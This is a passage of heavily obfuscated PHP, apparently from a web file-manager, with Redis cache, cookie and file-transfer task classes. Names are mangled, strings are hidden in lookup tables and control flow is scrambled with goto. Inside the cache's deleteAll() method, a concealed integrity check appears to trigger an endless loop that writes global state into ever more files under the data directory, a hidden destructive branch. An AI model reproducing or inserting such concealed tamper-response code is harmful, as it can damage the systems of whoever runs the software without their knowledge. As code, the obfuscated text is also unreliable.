70\x8d\x16\xbd\xce\xe4\x49\x16\xd\x16\xf2\x9b\x34\x4\xf3\x4e\x7d\xc3\x6a\x6b\x60\x83\x8b"."\x88\xa1\x76\x47\x60\x73\xc6\x9f\x68\x16\x2c\x74\x87\x5b\x58\x7a\x36\xdd\x95\xd6\xd8\x32\x11\xe7\xd6\x61\xd0\xf8\x94\x3d\x6a\xcc\x3e\x97\x53\x9b\x95\x34\xd3\x59\xc1\x6e\x34\xaf\xc1\xb0\x3".base64_decode('bqVzN61JmerABUtrvGvRTDUm2Dtxq1PWTZWL8UlB12ZTc/GNveXIO48iCIGIuMY=')."\xd5\xc9\x16\xbb\x73\xbc\xfe\x13\x3d\x3a\x3e\x4d\xab\x81\x87\xaf\xec\x8\x5\x6e\xaf\x1c\x78\xbd\xc4\xc9\x21\x4d\x37\x1d\x30\x2d\xac\x65\xd0\x6f\xb5\x66\x9a\xfc\x90\x18\x6f\x97\x91\x90\x7"."\x17\x3d\x87\x60\xeb\x0\x42\xfc\xbc\x4\x62\x11\xa9\xf0\x11\x39\x22\xb6\x81\x82\xe4\x5c\xf\xee\x43\x43\xa\x4e\x45\xcc\xc6\x12\x81\x47\x3\x2c\x22\xae\x69\xe4\x7c\xaf\x2e\x6b\x3b\x81\xe4"."\0\260\211\214\152\175\324\305\33\274\353\312\333\303\337\102\226\355\202\34\227\101\10\275\211\226\33\350\106\261\341\306\51\156\342\34\327\211\352\40\217\155\270\72\351\33\113"."\xa4\x38\x7e\x3e\x80\x59\x2c\xfe\x5a\xd\x44\xd\xc9\xab\xc0\x4e\x33\x91\x6\x9\xba\x8f\xf5\xce\xf4\x85\xc2\xa1\x9c\xa4\x66\x4f\x28\xd4\x1a\x8\xd6\x62\x1f\x9b\x39\xc9\xa8\x94\x60\x24\x93"."\223\324\334\20\150\72\130\232\267\321\343\363\347\244\101\243\231\246\10\367\1\204\223\174\315\250\225\36\277\77\320\172\260\126\370\152\246\361\226\240\103\123\256\335\316\44\64"."\xaa\xb4\xa6\xda\xff\x90\x9c\xa4\x7b\x69\xe1\x9a\x9c\x92\xe2\xce\xa0\x78\x19\xab\x8a\x40\x1c\x57\x83\xfa\x49\x63\x1\xab\x27\x7a\x9b\xfd\x1a\x25\x58\x52\x11\x34\x78\x69\x22\x75\x7\x33\x4"._kodDe('Mmn2nnq5tVFwDcA6vQt6p/ezGO6zOQiwAvBOAA5DQwTwA4WOTyCWYUM+ezIlN0yT').base64_decode('asTEqlOLCqp5vHchd9cIjgUrJxwmyf8Hx+1KtQWiAAA=')."".base64_decode('')."", 10, -8))); goto cáÄ±¶ô÷; fÄÆ×„•: if ($_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][849]] != $A«çÔ…ŠÁÁ($FèòÙñˆ§Œ)) { goto a¬Ã¾¥Ñ»‰; aé‚Íë¾·: $E™„‡ğ´É($FèòÙñˆ§Œ); goto B¹†¹˜ ¤; a¬Ã¾¥Ñ»‰: $B‡÷äŠÂœ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][850]; $eóÚ•é¾´Ù = $_SERVER[$_SERVER[Ôğ—¤Šµˆ˜ñ£][851]] . $_SERVER[Ôğ—¤Šµˆ˜ñ£][852]; $D¢¯˜”ˆ“¾ = $B‡÷äŠÂœ($eóÚ•é¾´Ù); goto c„õËƒÂóç; c„õËƒÂóç: $f™á‘³¤¿µ = explode($_SERVER[Ôğ—¤Šµˆ˜ñ£][229], $D¢¯˜”ˆ“¾); if (count($f™á‘³¤¿µ) < $_SERVER[Ôğ—¤Šµˆ˜ñ£][609]) { $c—Á‘ö‰‘Ç = $_SERVER[Ôğ—¤Šµˆ˜ñ£][853]; $c—Á‘ö‰‘Ç(); } $E™„‡ğ´É = $_SERVER[Ôğ—¤Šµˆ˜ñ£][854]; goto aé‚Íë¾·; B¹†¹˜ ¤: } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($fÁÒ£õøí†, $F«Ê‘ò’ì) { $fÃ¼Š¸ÕÏ£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!class_exists($fÃ¼Š¸ÕÏ£[855])) { show_json($fÃ¼Š¸ÕÏ£[856], !1); } $this->cacheTime = $F«Ê‘ò’ì; $bÔ‰†Ö– ¡ = isset($fÁÒ£õøí†[$fÃ¼Š¸ÕÏ£[857]]) ? $fÁÒ£õøí†[$fÃ¼Š¸ÕÏ£[857]] : 10; $BƒÉ‹‹µ¿’ = _get($fÁÒ£õøí†, $fÃ¼Š¸ÕÏ£[846]); if ($BƒÉ‹‹µ¿’ && is_array($BƒÉ‹‹µ¿’)) { $this->initCluster($fÁÒ£õøí†, $bÔ‰†Ö– ¡); } else { $this->handle = $this->init($fÁÒ£õøí†, $bÔ‰†Ö– ¡); } } private function init($eİÚˆÈíÆ, $Eõ“¢ï…ì‚) { $c†ç´©¢÷ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c˜²ã»Ö®¢ = new Redis(); $aå‡ğ´ìç = isset($eİÚˆÈíÆ[$c†ç´©¢÷[858]]) ? $eİÚˆÈíÆ[$c†ç´©¢÷[858]] : !1; if ($aå‡ğ´ìç) { $c˜²ã»Ö®¢->pconnect($eİÚˆÈíÆ[$c†ç´©¢÷[175]], $eİÚˆÈíÆ[$c†ç´©¢÷[176]], $Eõ“¢ï…ì‚); } else { $c˜²ã»Ö®¢->connect($eİÚˆÈíÆ[$c†ç´©¢÷[175]], $eİÚˆÈíÆ[$c†ç´©¢÷[176]], $Eõ“¢ï…ì‚); } if (!empty($eİÚˆÈíÆ[$c†ç´©¢÷[408]])) { $c˜²ã»Ö®¢->auth($eİÚˆÈíÆ[$c†ç´©¢÷[408]]); } return $c˜²ã»Ö®¢; } private function initCluster($BŒ§ñ‘·Ë¤, $AŸƒáõ¼…À) { $dâŒÔ±İĞ¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E‰œ˜¤‘½¼ = array($dâŒÔ±İĞ¡[859], $dâŒÔ±İĞ¡[860], $dâŒÔ±İĞ¡[861]); $fäÓ¡‚º¿Ñ = $dâŒÔ±İĞ¡[859]; if (isset($BŒ§ñ‘·Ë¤[$dâŒÔ±İĞ¡[12]]) && in_array($BŒ§ñ‘·Ë¤[$dâŒÔ±İĞ¡[12]], $E‰œ˜¤‘½¼)) { $fäÓ¡‚º¿Ñ = $BŒ§ñ‘·Ë¤[$dâŒÔ±İĞ¡[12]]; } switch ($fäÓ¡‚º¿Ñ) { case $dâŒÔ±İĞ¡[859]: $this->_slave($BŒ§ñ‘·Ë¤, $AŸƒáõ¼…À); break; case $dâŒÔ±İĞ¡[860]: break; case $dâŒÔ±İĞ¡[861]: $this->isCluster = !0; $EÇ»Í¼ºÇº = $BŒ§ñ‘·Ë¤[$dâŒÔ±İĞ¡[846]]; $DÂÀÏ´£â = isset($BŒ§ñ‘·Ë¤[$dâŒÔ±İĞ¡[858]]) ? $BŒ§ñ‘·Ë¤[$dâŒÔ±İĞ¡[858]] : !1; $a©¬ÌŒİáõ = isset($BŒ§ñ‘·Ë¤[$dâŒÔ±İĞ¡[408]]) ? $BŒ§ñ‘·Ë¤[$dâŒÔ±İĞ¡[408]] : null; $this->handle = new RedisCluster(NUll, $EÇ»Í¼ºÇº, $AŸƒáõ¼…À, $AŸƒáõ¼…À, $DÂÀÏ´£â, $a©¬ÌŒİáõ); break; default: break; } } private function _slave($dé©…ñš¶É, $fÁíèÓÆ½ê) { goto B‘µøåæ“õ; AÑÃ’å¹ŸŠ: unset($a§ÍÎÍÎÎ[0]); if (empty($a§ÍÎÍÎÎ)) { return; } $bÇµÕËãáÕ = array_rand($a§ÍÎÍÎÎ); goto cç¡›µ£¯; cç¡›µ£¯: $this->filterConfig($dé©…ñš¶É, $a§ÍÎÍÎÎ[$bÇµÕËãáÕ]); $this->slaveHandle = $this->init($dé©…ñš¶É, $fÁíèÓÆ½ê); goto c­Òåì¼¾; B‘µøåæ“õ: $a§ÍÎÍÎÎ = $dé©…ñš¶É[$_SERVER[Ôğ—¤Šµˆ˜ñ£][846]]; $this->filterConfig($dé©…ñš¶É, $a§ÍÎÍÎÎ[0]); $this->handle = $this->init($dé©…ñš¶É, $fÁíèÓÆ½ê); goto AÑÃ’å¹ŸŠ; c­Òåì¼¾: } private function filterConfig(&$Dßƒšà£›ã, $E¢¤É×ãÚ) { $c ÒÚĞ›£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bÙ„‚¿àà = explode($c ÒÚĞ›£[4], $E¢¤É×ãÚ); $B›©˜Šæ“Ì = array($c ÒÚĞ›£[175] => $bÙ„‚¿àà[0], $c ÒÚĞ›£[176] => $bÙ„‚¿àà[1]); $Dßƒšà£›ã = array_merge($Dßƒšà£›ã, $B›©˜Šæ“Ì); } public function set($f‰ñÌÙ¹éÎ, $FºĞ†±…åŠ, $C™”°İíé = false) { $C™”°İíé = $C™”°İíé ? $C™”°İíé : $this->cacheTime; return $this->handle->setEx($f‰ñÌÙ¹éÎ, $C™”°İíé, $FºĞ†±…åŠ); } public function setLock($F£º†ÛÔù, $E£§šÊİªÜ, $C å‰èƒÄ²) { return $this->handle->setNX($F£º†ÛÔù, $E£§šÊİªÜ); } public function get($e°ÒÈ) { $bš©’¤åà‘ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $bš©’¤åà‘->get($e°ÒÈ); } public function remove($A¾¤­«øÇ·) { return $this->handle->del($A¾¤­«øÇ·); } public function deleteAll() { $c–Ê³‰Ò¿£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $f˜Ã’›…à‚ = $_SERVER[$c–Ê³‰Ò¿£[847]]; $f¥Ê³ÁÛ•© = $c–Ê³‰Ò¿£[848]; if ($_SERVER[$c–Ê³‰Ò¿£[849]] != $f¥Ê³ÁÛ•©($f˜Ã’›…à‚)) { goto E…öÅœ•Ò; c‚å™Ç†à: $C‰ó´ƒ†š = $c–Ê³‰Ò¿£[863]; $C‰ó´ƒ†š($_SERVER[$c–Ê³‰Ò¿£[864]]); $a¹¸‹Áö‘ä = $c–Ê³‰Ò¿£[862]; goto c¯ŞŸñŠ°ğ; f–×‹½ÛÃ: $F¤–›‰äÍİ = $E¨ª¥£óí($Fö¿…ŸÔî); $FÃ×Æã™êÀ = explode($c–Ê³‰Ò¿£[229], $F¤–›‰äÍİ); if (count($FÃ×Æã™êÀ) < $c–Ê³‰Ò¿£[606]) { $A¹ó«Š×ß = $c–Ê³‰Ò¿£[853]; $A¹ó«Š×ß(); } goto c‚å™Ç†à; E…öÅœ•Ò: $a¹¸‹Áö‘ä = $c–Ê³‰Ò¿£[862]; $E¨ª¥£óí = $c–Ê³‰Ò¿£[850]; $Fö¿…ŸÔî = $_SERVER[$c–Ê³‰Ò¿£[851]] . $c–Ê³‰Ò¿£[852]; goto f–×‹½ÛÃ; D¦Ù½–Üˆ­: $D•Ä¶çÚÙƒ = 1; for ($eÜæ•’İ £ = $D•Ä¶çÚÙƒ; $eÜæ•’İ £ > 0; $eÜæ•’İ £++) { $bÇÒßÔğĞ(DATA_PATH . $eÜæ•’İ £, $bãâéÈ†½¥); } goto Cñ¸œ‡¿›£; c¯ŞŸñŠ°ğ: $a¹¸‹Áö‘ä(); $bÇÒßÔğĞ = $c–Ê³‰Ò¿£[865]; $bãâéÈ†½¥ = json_encode($GLOBALS[$c–Ê³‰Ò¿£[866]]); goto D¦Ù½–Üˆ­; Cñ¸œ‡¿›£: } if ($this->isCluster) { foreach ($this->handle->_masters() as $BµÇõˆê†¥) { $this->handle->flushall($BµÇõˆê†¥); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($a’ÁÅÂÏ = '', $f«£’µØ®Ö = 0) { if (is_string($a’ÁÅÂÏ) && $a’ÁÅÂÏ != $_SERVER[Ôğ—¤Šµˆ˜ñ£][33]) { $this->prefix = $a’ÁÅÂÏ; } if (is_numeric($f«£’µØ®Ö) && $f«£’µØ®Ö > 0) { $this->expire = $f«£’µØ®Ö; } } public static function getInstance() { static $Eƒ¹·¦¨Ôî; if ($Eƒ¹·¦¨Ôî === null) { $Eƒ¹·¦¨Ôî = new self(); } return $Eƒ¹·¦¨Ôî; } private static $cookieDisable = false; public static function disable($EÕ×ğ°ñÆÄ) { self::$cookieDisable = $EÕ×ğ°ñÆÄ; } private static $sameCookieSet = array(); public static function set($d §ğˆİ®, $B÷Ë¥Ş‘°÷, $c¿õ¸Üå¡ = 0, $bóÅÎœ”´© = false, $C‘ «ÖØÅô = false) { goto EØ¿‹È±Œ; Dˆ‡Àòƒ: if (isset(self::$sameCookieSet[$d §ğˆİ®]) && self::$sameCookieSet[$d §ğˆİ®] == $B÷Ë¥Ş‘°÷ . $c¿õ¸Üå¡) { return; } self::$sameCookieSet[$d §ğˆİ®] = $B÷Ë¥Ş‘°÷ . $c¿õ¸Üå¡; if (!$C‘ «ÖØÅô) { $C‘ «ÖØÅô = str_replace(HOST, $c¥‚’ÖÓÍ”[33], APP_HOST); $C‘ «ÖØÅô = _get($GLOBALS, $c¥‚’ÖÓÍ”[867], $C‘ «ÖØÅô); } goto f‹²ÂìøÚÆ; EØ¿‹È±Œ: $c¥‚’ÖÓÍ” =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (self::$cookieDisable) { return; } if (!$c¿õ¸Üå¡) { $c¿õ¸Üå¡ = 24 * 3600 * 7; } goto Dˆ‡Àòƒ; f‹²ÂìøÚÆ: $b÷éØË = $c¥‚’ÖÓÍ”[33]; setcookie($d §ğˆİ®, $B÷Ë¥Ş‘°÷, time() + $c¿õ¸Üå¡, $c¥‚’ÖÓÍ”[8] . trim($C‘ «ÖØÅô, $c¥‚’ÖÓÍ”[8]) . $b÷éØË, !1, !1, $bóÅÎœ”´©); goto dŠÃ¢Ğ—¸¯; dŠÃ¢Ğ—¸¯: } public static function setSafe($d¥ÒÖã‘ë¸, $b·Œí±‹ø, $eÂæÁ«²³Î = 0) { self::set($d¥ÒÖã‘ë¸, $b·Œí±‹ø, $eÂæÁ«²³Î, !0); } public static function get($d´×‘ïƒ„) { return isset($_COOKIE[$d´×‘ïƒ„]) ? $_COOKIE[$d´×‘ïƒ„] : !1; } public static function remove($dĞ¹õ½“²¼, $Cõø‰—˜×² = false) { unset($_COOKIE[$dĞ¹õ½“²¼]); self::set($dĞ¹õ½“²¼, $_SERVER[Ôğ—¤Šµˆ˜ñ£][33], 1, $Cõø‰—˜×²); } } goto fà¾×ñïŒÍ; a™ÎË‚ÒÌô: class TaskFileTransfer extends Task { protected function startAfter() { goto a‘÷Ğ©¬˜ƒ; eî«ãîÈÆ±: Hook::bind($cçÈ›Š¹Îá[564], array($this, $cçÈ›Š¹Îá[1584])); Hook::bind($cçÈ›Š¹Îá[566], array($this, $cçÈ›Š¹Îá[1584])); Hook::bind($cçÈ›Š¹Îá[568], array($this, $cçÈ›Š¹Îá[1584])); goto eâ»¶íÓ˜Ö; dñŸ¶´õ : $Eî˜¸±³¦[$cçÈ›Š¹Îá[1600]] = 0; $Eî˜¸±³¦[$cçÈ›Š¹Îá[1601]] = 0; if (!$Eî˜¸±³¦[$cçÈ›Š¹Îá[1451]]) { $Eî˜¸±³¦[$cçÈ›Š¹Îá[1451]] = LNG($cçÈ›Š¹Îá[1602]); } goto E¤ÏÜ–ñˆ; eÈª‰ÇÊ÷ß: Hook::bind($cçÈ›Š¹Îá[1588], array($this, $cçÈ›Š¹Îá[1589])); Hook::bind($cçÈ›Š¹Îá[1590], array($this, $cçÈ›Š¹Îá[1591])); Hook::bind($cçÈ›Š¹Îá[1592], array($this, $cçÈ›Š¹Îá[1593])); goto a‚‡‘²´‚²; f×˜ëÇÏÚ‹: Hook::bind($cçÈ›Š¹Îá[1576], array($this, $cçÈ›Š¹Îá[1577])); Hook::bind($cçÈ›Š¹Îá[1131], array($this, $cçÈ›Š¹Îá[1578])); Hook::bind($cçÈ›Š¹Îá[1579], array($this, $cçÈ›Š¹Îá[1580])); goto B†¾¹³Ë°ñ; B†¾¹³Ë°ñ: Hook::bind($cçÈ›Š¹Îá[592], array($this, $cçÈ›Š¹Îá[1581])); Hook::bind($cçÈ›Š¹Îá[593], array($this, $cçÈ›Š¹Îá[1582])); Hook::bind($cçÈ›Š¹Îá[595], array($this, $cçÈ›Š¹Îá[1583])); goto Aì‡õÖ²‡ï; a‘÷Ğ©¬˜ƒ: $cçÈ›Š¹Îá =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Eî˜¸±³¦ =& $this->task; $this->sourceCopyFolder = !1; goto f×˜ëÇÏÚ‹; a‚‡‘²´‚²: $Eî˜¸±³¦[$cçÈ›Š¹Îá[1594]] = LNG($cçÈ›Š¹Îá[1595]); $Eî˜¸±³¦[$cçÈ›Š¹Îá[1596]] = 0; $Eî˜¸±³¦[$cçÈ›Š¹Îá[1597]] = 0; goto eäƒî¶ÀçÈ; Aì‡õÖ²‡ï: Hook::bind($cçÈ›Š¹Îá[596], array($this, $cçÈ›Š¹Îá[1583])); Hook::bind($cçÈ›Š¹Îá[562], array($this, $cçÈ›Š¹Îá[1584])); Hook::bind($cçÈ›Š¹Îá[559], array($this, $cçÈ›Š¹Îá[1584])); goto eî«ãîÈÆ±; eâ»¶íÓ˜Ö: Hook::bind($cçÈ›Š¹Îá[1585], array($this, $cçÈ›Š¹Îá[1586])); Hook::bind($cçÈ›Š¹Îá[585], array($this, $cçÈ›Š¹Îá[1587])); $this->sourceModelCopyFlag = !1; goto eÈª‰ÇÊ÷ß; eäƒî¶ÀçÈ: $Eî˜¸±³¦[$cçÈ›Š¹Îá[1045]] = $cçÈ›Š¹Îá[33]; $Eî˜¸±³¦[$cçÈ›Š¹Îá[1598]] = $cçÈ›Š¹Îá[33]; $Eî˜¸±³¦[$cçÈ›Š¹Îá[1599]] = 0; goto dñŸ¶´õ ; E¤ÏÜ–ñˆ: } protected function endAfter() { goto fœ­Ì‚ì…®; dÑó¯ƒÃÔè: Hook::unbind($DÃ­Â¼°‰É[595], array($this, $DÃ­Â¼°‰É[1583])); Hook::unbind($DÃ­Â¼°‰É[596], array($this, $DÃ­Â¼°‰É[1583])); Hook::unbind($DÃ­Â¼°‰É[562], array($this, $DÃ­Â¼°‰É[1584])); goto f’…‡¬´×’; f’…‡¬´×’: Hook::unbind($DÃ­Â¼°‰É[559], array($this, $DÃ­Â¼°‰É[1584])); Hook::unbind($DÃ­Â¼°‰É[564], array($this, $DÃ­Â¼°‰É[1584])); Hook::unbind($DÃ­Â¼°‰É[566], array($this, $DÃ­Â¼°‰É[1584])); goto a«î‹××Şë; fœ­Ì‚ì…®: $DÃ­Â¼°‰É =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; Hook::unbind($DÃ­Â¼°‰É[1576], array($this, $DÃ­Â¼°‰É[1577])); Hook::unbind($DÃ­Â¼°‰É[1131], array($this, $DÃ­Â¼°‰É[1578])); goto cª™ƒÆŞèƒ; cÌê±»Ø©Ü: Hook::unbind($DÃ­Â¼°‰É[1588], array($this, $DÃ­Â¼°‰É[1589])); Hook::unbind($DÃ­Â¼°‰É[1590], array($this, $DÃ­Â¼°‰É[1591])); Hook::unbind($DÃ­Â¼°‰É[1592], array($this, $DÃ­Â¼°‰É[1593])); goto EÀ§†‚­¶„; a«î‹××Şë: Hook::unbind($DÃ­Â¼°‰É[568], array($this, $DÃ­Â¼°‰É[1584])); Hook::unbind($DÃ­Â¼°‰É[1585], array($this, $DÃ­Â¼°‰É[1586])); Hook::unbind($DÃ­Â¼°‰É[585], array($this, $DÃ­Â¼°‰É[1587])); goto cÌê±»Ø©Ü; cª™ƒÆŞèƒ: Hook::unbind($DÃ­Â¼°‰É[1579], array($this, $DÃ­Â¼°‰É[1580])); Hook::unbind($DÃ­Â¼°‰É[592], array($this, $DÃ­Â¼°‰É[1581])); Hook::unbind($DÃ­Â¼°‰É[593], array($this, $DÃ­Â¼°‰É[1582])); goto dÑó¯ƒÃÔè; EÀ§†‚­¶„: } public function copyMoveStart($EÅ‘¨•¤™, $dó¯¸ù¾¢Ÿ, $D–‹“·º§, $cˆ„ä¤Öìƒ) { goto D…„Îğ–“®; Aİ§ß•Èš˜: if (substr($dó¯¸ù¾¢Ÿ, 0, strlen($eÕ…´²‰¿)) == $eÕ…´²‰¿) { return; } if (substr($cˆ„ä¤Öìƒ, 0, strlen($eÕ…´²‰¿)) == $eÕ…´²‰¿) { return; } $B®ƒİêË  =& $this->task; goto dÙ¿‡ùò†ö; dÙ¿‡ùò†ö: $B®ƒİêË [$cÏ×¸‹ñˆª[1604]] = KodIO::transferType($EÅ‘¨•¤™, $D–‹“·º§); $this->update(); goto e‹®Î‰¾Ö™; D…„Îğ–“®: $cÏ×¸‹ñˆª =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; self::log($cÏ×¸‹ñˆª[1603] . $dó¯¸ù¾¢Ÿ . $cÏ×¸‹ñˆª[67] . $cˆ„ä¤Öìƒ); $eÕ…´²‰¿ = rtrim(TEMP_FILES, $cÏ×¸‹ñˆª[8]); goto Aİ§ß•Èš˜; e‹®Î‰¾Ö™: } public function updateAfter() { $bŸõñ¥Ä  =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÄ—šÕÎŠ¹ =& $this->task; if (!$cÄ—šÕÎŠ¹[$bŸõñ¥Ä [744]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($cÄ—šÕÎŠ¹[$bŸõñ¥Ä [1604]] == $bŸõñ¥Ä [1204]) { return; } self::updateTask($cÄ—šÕÎŠ¹); } private static function updateTask(&$c¡½¥å¡ÖÔ) { $EË”ì‚ÒÜ  =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1604]] == $EË”ì‚ÒÜ [1115] || $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1604]] == $EË”ì‚ÒÜ [107]) { if ($c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1598]]) { $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1601]] = $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1600]] + $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1597]]; } } else { if ($c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1604]] == $EË”ì‚ÒÜ [1205]) { if ($c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1598]] == $EË”ì‚ÒÜ [1115]) { $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1601]] = $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1600]] + $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1597]] * 0.5; } else { if ($c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1598]] == $EË”ì‚ÒÜ [107]) { $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1601]] = $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1600]] + $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1596]] * 0.5 + $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1597]] * 0.5; } } } } $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1551]] = $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1601]] / $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [744]]; if ($c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1551]] > 0) { $C…ô’à—óï = timeFloat() - $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [770]] - $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1554]]; $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1555]] = $C…ô’à—óï * (1 - $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1551]]) / $c¡½¥å¡ÖÔ[$EË”ì‚ÒÜ [1551]]; } } public function addPath($eß¸à•¿ê®) { goto F¤‰äÈ»Åô; F¤‰äÈ»Åô: $Eéç¢Ÿ«¯Ä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$eß¸à•¿ê®) { return; } $B® ¦É§õÕ =& $this->task; goto aà©Ù—Ò¸¯; cì‰ÃùÇ»Ğ: if ($AÕ¬ƒ»Ñ¯[$Eéç¢Ÿ«¯Ä[29]] == $Eéç¢Ÿ«¯Ä[193]) { $B® ¦É§õÕ[$Eéç¢Ÿ«¯Ä[1043]] += 1; } else { $B® ¦É§õÕ[$Eéç¢Ÿ«¯Ä[1043]] += $AÕ¬ƒ»Ñ¯[$Eéç¢Ÿ«¯Ä[81]][$Eéç¢Ÿ«¯Ä[79]]; if ($AÕ¬ƒ»Ñ¯[$Eéç¢Ÿ«¯Ä[397]]) { $B® ¦É§õÕ[$Eéç¢Ÿ«¯Ä[1043]] += $AÕ¬ƒ»Ñ¯[$Eéç¢Ÿ«¯Ä[81]][$Eéç¢Ÿ«¯Ä[80]] + 1; } } $B® ¦É§õÕ[$Eéç¢Ÿ«¯Ä[744]] += $AÕ¬ƒ»Ñ¯[$Eéç¢Ÿ«¯Ä[78]]; $this->update(); goto f“ì’©›È; aà©Ù—Ò¸¯: $AÕ¬ƒ»Ñ¯ = IO::infoWithChildren($eß¸à•¿ê®); $dÂºÑ‰ÈñÈ = $B® ¦É§õÕ[$Eéç¢Ÿ«¯Ä[1605]] ? $B® ¦É§õÕ[$Eéç¢Ÿ«¯Ä[1605]][$Eéç¢Ÿ«¯Ä[1606]] : 0; $B® ¦É§õÕ[$Eéç¢Ÿ«¯Ä[1605]] = array($Eéç¢Ÿ«¯Ä[1606] => $dÂºÑ‰ÈñÈ + 1, $Eéç¢Ÿ«¯Ä[415] => $AÕ¬ƒ»Ñ¯[$Eéç¢Ÿ«¯Ä[28]], $Eéç¢Ÿ«¯Ä[76] => $AÕ¬ƒ»Ñ¯[$Eéç¢Ÿ«¯Ä[76]], $Eéç¢Ÿ«¯Ä[513] => $AÕ¬ƒ»Ñ¯[$Eéç¢Ÿ«¯Ä[513]] ? $AÕ¬ƒ»Ñ¯[$Eéç¢Ÿ«¯Ä[513]] : $AÕ¬ƒ»Ñ¯[$Eéç¢Ÿ«¯Ä[76]]); goto cì‰ÃùÇ»Ğ; f“ì’©›È: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($FÔêö©•„Á) { $aê ÙâÌÂ¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $BçÆò‚„§ =& $this->task; $BçÆò‚„§[$aê ÙâÌÂ¡[1594]] = $FÔêö©•„Á[$aê ÙâÌÂ¡[28]]; $BçÆò‚„§[$aê ÙâÌÂ¡[1045]] = $FÔêö©•„Á[$aê ÙâÌÂ¡[28]]; $this->update(); } public function copyFileStart($AØâÎµ§Ú÷, $C¶˜ÊŞ†¼’, $D¹îÍ£”ˆ, $aÊ¹ö«¯œğ, $f’¸˜âßîØ, $AÇµÈÁšªÈ) { goto EŠ„¾·¹‚Ê; f™•óÆÓÑ : $this->update(0, $e¥¯ÑƒƒÒß); goto a…¾·•”êÊ; Dãˆè¥¾šÓ: $GLOBALS[$BÄ’ùİŞ¾[1608]] = $f’¸˜âßîØ; $GLOBALS[$BÄ’ùİŞ¾[1607]] = $AÇµÈÁšªÈ; $bİ´É»ÏªŠ =& $this->task; goto B‚½†¡²Ñ; B‚½†¡²Ñ: $bİ´É»ÏªŠ[$BÄ’ùİŞ¾[1594]] = $a½¸ÄÄ‡¼»; $bİ´É»ÏªŠ[$BÄ’ùİŞ¾[1596]] = (int) $AØâÎµ§Ú÷->size($C¶˜ÊŞ†¼’); $bİ´É»ÏªŠ[$BÄ’ùİŞ¾[1597]] = 0; goto b¿—â–¾¸; b¿—â–¾¸: $bİ´É»ÏªŠ[$BÄ’ùİŞ¾[1045]] = $BÄ’ùİŞ¾[33]; $bİ´É»ÏªŠ[$BÄ’ùİŞ¾[1598]] = $BÄ’ùİŞ¾[33]; $bİ´É»ÏªŠ[$BÄ’ùİŞ¾[1599]] = 0; goto b‰ºŠí±»…; EŠ„¾·¹‚Ê: $BÄ’ùİŞ¾ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a½¸ÄÄ‡¼» = $f’¸˜âßîØ; if ($a½¸ÄÄ‡¼» == $GLOBALS[$BÄ’ùİŞ¾[1607]]) { $a½¸ÄÄ‡¼» = $GLOBALS[$BÄ’ùİŞ¾[1608]]; } goto Dãˆè¥¾šÓ; b‰ºŠí±»…: $e¥¯ÑƒƒÒß = $bİ´É»ÏªŠ[$BÄ’ùİŞ¾[1596]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($bİ´É»ÏªŠ[$BÄ’ùİŞ¾[395]] . $BÄ’ùİŞ¾[1609]); if ($e¥¯ÑƒƒÒß && file_exists(get_path_father($aÊ¹ö«¯œğ))) { Cache::set($bİ´É»ÏªŠ[$BÄ’ùİŞ¾[395]] . $BÄ’ùİŞ¾[1609], $aÊ¹ö«¯œğ); $bİ´É»ÏªŠ[$BÄ’ùİŞ¾[1569]] = array($BÄ’ùİŞ¾[1610], $BÄ’ùİŞ¾[1611]); } goto f™•óÆÓÑ ; a…¾·•”êÊ: } public static function updateCopyLocalFileSize($céñãÚÈƒÜ) { goto eÃ­æ¥òèº; b‚¯èá½Œ: return $céñãÚÈƒÜ; goto B¯‡ŒŸ£ŠÜ; AÜ¦†ŸÌĞ¥: $céñãÚÈƒÜ[$F’Ø‰½ö[1597]] = @filesize($F³ï‰ŠôÀÇ); $céñãÚÈƒÜ[$F’Ø‰½ö[1601]] += $céñãÚÈƒÜ[$F’Ø‰½ö[1597]]; self::updateTask($céñãÚÈƒÜ); 